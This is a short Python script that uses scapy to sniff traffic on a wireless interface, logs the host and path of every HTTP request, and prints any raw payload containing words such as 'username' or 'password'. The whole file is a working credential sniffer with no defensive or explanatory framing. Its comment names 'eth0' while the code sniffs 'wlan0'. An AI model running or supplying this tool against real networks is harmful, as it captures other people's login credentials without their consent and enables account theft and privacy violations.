#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"URL: {url}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load.lower():
                    print(f"Sensitive Data: {load}")
                    break

# Change 'eth0' to the correct interface name
sniff("wlan0")
